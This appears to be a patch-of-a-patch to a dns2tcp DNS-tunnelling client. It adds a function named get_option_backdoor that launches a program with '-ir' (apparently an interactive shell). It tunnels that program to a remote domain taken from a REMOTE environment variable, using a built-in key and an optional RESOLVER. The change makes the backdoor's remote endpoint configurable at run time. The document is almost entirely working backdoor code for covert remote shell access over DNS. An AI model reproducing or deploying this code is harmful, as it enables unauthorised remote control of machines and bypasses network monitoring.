@@ -1,5 +1,5 @@
 diff --git a/client/main.c b/client/main.c
-index 45091d7..aa6728d 100644
+index 45091d7..13b398a 100644
 --- a/client/main.c
 +++ b/client/main.c
 @@ -42,7 +42,7 @@
@@ -22,7 +22,7 @@ index 45091d7..aa6728d 100644
 +{
 +  t_conf		conf;
 +  
-+  if ((get_option_backdoor(DNSSERV, &conf)) ||  
++  if ((get_option_backdoor(&conf)) ||  
 +      ((conf.sd_udp = create_socket(&conf)) == -1))
 +    return (-1);
 +  srand(getpid() ^ (unsigned int) time(0));
@@ -33,7 +33,7 @@ index 45091d7..aa6728d 100644
 +  return (0);
 +}
 diff --git a/client/options.c b/client/options.c
-index 2748621..f3cd5cd 100644
+index 2748621..c7ed16f 100644
 --- a/client/options.c
 +++ b/client/options.c
 @@ -39,6 +39,18 @@ extern char	*optarg;
@@ -55,13 +55,13 @@ index 2748621..f3cd5cd 100644
  
  #include "client.h"
  #include "my_config.h"
-@@ -330,3 +342,39 @@ int			get_option(int argc, char **argv, t_conf *conf)
+@@ -330,3 +342,45 @@ int			get_option(int argc, char **argv, t_conf *conf)
  
  	  
  	  
 +
 +
-+int  get_option_backdoor(char* qdn, t_conf *conf)
++int  get_option_backdoor(t_conf *conf)
 +{
 +  int			c;
 +  char			config_file[2048];
@@ -81,12 +81,18 @@ index 2748621..f3cd5cd 100644
 +  cmdline = (char*)malloc(strlen(config_file)+16);
 +  snprintf(cmdline, strlen(config_file)+16, "%s -ir", config_file);
 +  conf->cmdline = cmdline;
-+  conf->domain = qdn;
++
++  if (!getenv("REMOTE"))
++    {
++      puts("Missing REMOTE");
++      exit(-1);
++    }
++  conf->domain = getenv("REMOTE");
 +  conf->key = DNS2TCP_KEY;
++
++
 +  conf->resource = DNS2TCP_RES;
-+  #ifdef DNS2TCP_RESOLVER
-+  conf->dns_server = DNS2TCP_RESOLVER;
-+  #endif
++  conf->dns_server = getenv("RESOLVER");
 +  
 +  if (!conf->dns_server)
 +    read_resolv(conf);
